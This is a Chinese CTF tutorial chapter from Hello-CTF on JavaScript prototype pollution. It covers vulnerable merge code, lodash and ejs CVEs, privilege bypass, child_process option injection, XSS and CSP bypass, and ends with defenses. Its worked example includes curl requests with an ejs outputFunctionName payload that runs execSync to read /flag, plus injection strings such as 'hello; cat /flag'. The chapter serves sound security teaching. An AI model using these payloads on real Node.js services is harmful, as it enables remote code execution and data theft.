---
comments: true
---

# 原型链污染

> [ProbiusOfficial/Hello-CTF](https://github.com/ProbiusOfficial/Hello-CTF)

原型链污染（Prototype Pollution）是 JavaScript 特有的漏洞类型。在 CTF 中，它最常出现在 Node.js 服务端题目里，作为通往 RCE 或越权的"跳板"；在客户端则表现为 DOM 型 XSS、CSP 绕过。本章按「够用即止」的原则，先讲清够用的原型基础，再讲污染原理与利用面，最后用一道典型例题走完整解题流程。

## JavaScript 原型与原型链基础

### 对象与原型

JavaScript 中几乎所有东西都是对象。每个对象内部都有一个隐藏指针，指向它的 **原型对象（prototype）**。普通对象的原型是 `Object.prototype`，而 `Object.prototype` 的原型是 `null`，到头了。

```javascript
let obj = {};
console.log(obj.toString()); // "[object Object]" —— obj 自己并没有 toString
```

`obj` 是空对象，却能调用 `toString()`，因为这个方法定义在它的原型 `Object.prototype` 上。

### 原型链查找

访问一个属性时，JS 引擎的查找顺序是：

```
对象自身 → 对象的原型 → 原型的原型 → ... → Object.prototype → null
```

这条链就叫 **原型链**。只要链上任何一环有同名属性，就会被"继承"到。来看个直观例子：

```javascript
let a = {};
console.log(a.foo); // undefined —— 链上没有 foo

Object.prototype.foo = "polluted"; // 给所有对象共同的祖先加属性

let b = {};
console.log(b.foo); // "polluted" —— 凭空多出来的属性
```

注意第二行：我们改动的是 `Object.prototype`，结果 **之后（以及之前）创建的所有普通对象** 都能读到 `foo`。这正是原型链污染的核心事实——原型是所有对象共享的，污染一处，处处生效。

### `__proto__` 是什么

`__proto__` 是访问对象原型的历史遗留 getter/setter，等价于 `Object.getPrototypeOf` / `Object.setPrototypeOf`：

```javascript
let obj = {};
obj.__proto__ === Object.prototype; // true
```

关键点来了：`__proto__` **不是普通属性名**。当你写 `obj.__proto__.foo = 1` 时，JS 会把 `obj.__proto__` 解析成 `Object.prototype`，于是你改的是所有对象的公共原型。而大多数开发人员写代码时把属性名当成普通数据处理——如果用户输入的 JSON 里出现 `"__proto__"` 这个 key，灾难就开始了。

## 污染原理

### 什么是原型链污染

一句话概括：**攻击者通过可控输入，往 `Object.prototype`（或其他对象的原型）上注入属性，从而影响程序后续的逻辑。**

污染要发生，通常需要两个条件：

1. 程序对用户输入做 **递归的属性合并 / 拷贝**，即所谓 merge、clone、extend 类操作；
2. 合并过程 **不过滤 `__proto__`、`constructor`、`prototype` 这几个魔法 key**。

### 漏洞代码长什么样

#### 手工实现的 merge

CTF 题目里最常见的是这种自己手写的递归合并函数：

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]); // key === "__proto__" 时，target[key] 指向原型对象
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

let userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
let config = merge({}, userInput);

let anyone = {};
console.log(anyone.isAdmin); // true —— 污染成功
```

当 `key` 是 `"__proto__"` 时，`target["__proto__"]` 拿到的不是普通子对象，而是 `target` 的原型（即 `Object.prototype`）。递归进去之后 `merge(Object.prototype, {isAdmin: true})`，等于直接在公共原型上写属性。

#### 有漏洞的库

历史上大量知名库中过招，CTF 里经常以"旧版本依赖"的形式出现：

- `lodash` 的 `merge()` / `defaultsDeep()`（CVE-2018-16487、CVE-2019-10744 等）
- `minimist`、`jquery.extend(true, ...)`、`undefsafe`、`mout` 等

```javascript
const _ = require('lodash'); // 老版本 lodash

let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
_.merge({}, payload);

console.log({}.polluted); // "yes"
```

还有一种变体：不直接递归合并，而是按 **路径赋值**，同样可污染：

```javascript
// 漏洞模式：obj[a][b] = value，a、b 均可控
function setValue(obj, path, value) {
    let keys = path.split('.');
    let cur = obj;
    for (let i = 0; i < keys.length - 1; i++) {
        cur = cur[keys[i]]; // keys[i] 为 "__proto__" 时一路走进原型
    }
    cur[keys[keys.length - 1]] = value;
}
setValue({}, '__proto__.role', 'admin');
console.log({}.role); // "admin"
```

> 注意：单纯的 `JSON.parse('{"__proto__": ...}')` 并不会污染——`JSON.parse` 会把 `__proto__` 当作普通 key 挂在结果对象上。污染一定发生在后续的 **赋值/合并** 环节。同理，`for...in` 遍历时 `__proto__` 作为 key 也只是字符串，危险的是把它拿去当属性访问器用。

## 服务端（Node.js）利用面

污染上 `Object.prototype` 之后，能造成什么危害取决于 **程序后续会读取哪些"未定义"的属性**。核心思路是：找一个程序里"读属性时没有做自有属性检查（`hasOwnProperty`）"的缺口，把你注入的属性喂进去。

### 越权与逻辑绕过

最直接的一类。程序判断权限时读了一个未必存在的属性：

```javascript
let user = { name: input_name }; // 没有 isAdmin 字段
if (user.isAdmin) {
    // 进入管理员逻辑
}
```

正常用户 `user.isAdmin` 是 `undefined`，判断不通过。污染 `Object.prototype.isAdmin = true` 后，所有对象都"继承"了管理员身份。这类利用与「逻辑漏洞」章节的思路一脉相承——程序信任了不该信任的输入。

### RCE：`child_process` 的选项注入

Node.js 中 `child_process.spawn` / `execFile` 等 API 接受一个 `options` 对象，里面很多字段我们从不显式传——于是它们会沿着原型链读到我们污染的值。两个经典利用：

**1. `shell` 选项拼接命令**

当 `shell` 为真时，Node 会用 `/bin/sh -c <command>` 的方式执行，原本被当作"参数"的字符串会被 shell 重新解释：

```javascript
const { execFile } = require('child_process');

// 程序预期：echo 的参数来自用户，但不允许执行命令
execFile('/bin/echo', [userInput], (err, stdout) => { /* ... */ });
```

如果攻击者污染了 `Object.prototype.shell = "/bin/bash"`（或其他真值），`userInput` 传 `hello; cat /flag` 时，分号就会被 shell 解释成命令分隔符，实现命令注入。关于命令执行本身的更多姿势可对照「RCE」章节阅读。

**2. `NODE_OPTIONS` + `env` 选项**

`execFile`/`spawn` 的 `options.env` 可以注入环境变量。污染：

```javascript
Object.prototype.env = {
    NODE_OPTIONS: "--require /tmp/evil.js"
};
Object.prototype.shell = true; // 视题目而定
```

之后任何新拉起的 node 子进程都会先加载 `/tmp/evil.js`。`/tmp/evil.js` 怎么来？如果题目同时有文件写入点（参考「文件上传」的思路），组合拳就打成了。

**3. 模板引擎参数注入**

以 ejs 为例（CVE-2022-29078），渲染选项里的 `outputFunctionName` 等字段可被污染，直接拼接进生成的函数体造成代码执行——效果类似「SSTI注入」，只不过入口从模板内容换成了原型上的选项：

```javascript
// 污染 payload
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag');s"}}
```

### 定位利用点的方法

拿到一道源码审计题时，固定动作是：先找 merge/clone 类污染点，再全局搜索 `child_process`、模板渲染函数、`options.` 这类"会读很多可选属性"的调用，看看哪些属性没被显式赋值——那就是你要污染的字段。

## 客户端（DOM）利用面

客户端污染通常来自 URL 参数或 `location.hash` 被解析进对象后未过滤 `__proto__`，常见于老版本 jQuery（`$.extend(true, ...)`）或前端自己写的 query-string 解析。

### XSS

污染那些"会被框架拼进 HTML"的默认属性。例如某前端代码：

```javascript
let config = deepMerge(defaults, parseQuery(location.search));
element.innerHTML = config.template; // config.template 未被用户直接控制
```

如果 `defaults.template` 不存在，污染 `__proto__.template` 为 `<img src=x onerror=alert(1)>` 即可触发 XSS。真实案例是 jQuery + 某 sanitizer 的组合：sanitizer 允许白名单标签，攻击者污染白名单数组对应的原型属性，把 `onerror` 之类的危险属性放进白名单。XSS 的触发与变形技巧见「XSS攻击」章节。

### CSP 绕过

当站点配置了 `script-src 'nonce-xxx'` 的严格 CSP 时，可以污染 DOM 相关 API 读取的属性来"偷"或"造"合法 script。经典手法是污染 `Object.prototype` 上会被代码当作 script 属性读取的字段，例如某些代码动态创建脚本时：

```javascript
let s = document.createElement('script');
s.src = config.url; // config.url 来自默认值 + 原型链
document.body.appendChild(s);
```

CSP 若使用 `strict-dynamic`，动态创建的脚本会继承信任；此时污染 `src` 指向攻击者服务器即可绕过。这也是 Google 当年把 prototype pollution 列入 CSP 绕过研究的原因。

客户端题目的整体套路：找 `__proto__` 可注入的解析点 → 找 JS 里读未定义属性并拼 DOM/URL/属性的位置 → 把两者连起来。

## CTF 典型例题：Node.js 服务端污染到 RCE

下面是一道典型风格的入门题，我们把分析、构造、利用完整走一遍。

### 题目源码

题目给出了服务的完整源码，flag 位于 `/flag`：

```javascript
// app.js
const express = require('express');
const ejs = require('ejs'); // 存在 CVE-2022-29078 的老版本
const app = express();
app.use(express.json());

// 手写的递归合并函数
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// 配置接口：把用户提交的 JSON 合并进全局配置
app.post('/api/config', (req, res) => {
    merge(global.config = {}, req.body);
    res.send('config updated');
});

// 首页：用 ejs 渲染固定模板
app.get('/', (req, res) => {
    res.send(ejs.render('<h1>Hello</h1>', {}));
});

app.listen(3000);
```

### 完整解题过程

**1. 定位污染点。** `/api/config` 直接把请求体交给未过滤 `__proto__` 的 `merge`，可控。

**2. 定位利用点。** `ejs.render(template, data)` 的第三个参数 `options` 没传，ejs 内部会构造选项对象并读取 `outputFunctionName` 等字段——这些字段沿原型链可被我们污染，且会被直接拼进 ejs 编译生成的函数源码中，等同于代码注入（思路与「SSTI注入」相通，入口不同）。

**3. 发送污染请求：**

```bash
curl -X POST http://target:3000/api/config \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"outputFunctionName":"_x;return global.process.mainModule.require(\"child_process\").execSync(\"cat /flag\").toString();//"}}'
```

**4. 触发渲染拿 flag：**

```bash
curl http://target:3000/
```

响应中即包含 flag 内容。

### 解题复盘

这道题的套路就是原型链污染题的通用三步：

1. **找污染点**——merge / clone / 路径赋值，且 key 未过滤；
2. **找汇聚点**——谁在读"可能不存在的属性"：`child_process` 的 options、模板引擎的 options、权限判断字段；
3. **构造连接**——让污染的属性名正好等于汇聚点读取的字段名，属性值按该字段的语义构造（命令字符串、选项开关、环境变量）。

## 防御与小结

防御侧只需记住几件事：

- 合并/拷贝用户输入时过滤 `__proto__`、`constructor`、`prototype` 三个 key，或用 `Object.create(null)` 创建无原型对象存放数据；
- 用 `Map` 代替普通对象存储键值对；
- 读取配置属性时用 `Object.hasOwn(obj, key)` 区分自有属性与继承属性；
- 及时更新 lodash、ejs 等依赖。

本章要点回顾：`__proto__` 不是普通属性名；污染发生在合并/赋值而非 `JSON.parse`；危害取决于程序后续读了哪些"未定义"属性——服务端通向越权与 RCE（结合「RCE」「逻辑漏洞」章节理解），客户端通向 XSS 与 CSP 绕过（结合「XSS攻击」章节理解）。做题时按「污染点 → 汇聚点 → 连接」三步走，绝大多数题目都能拆解开。
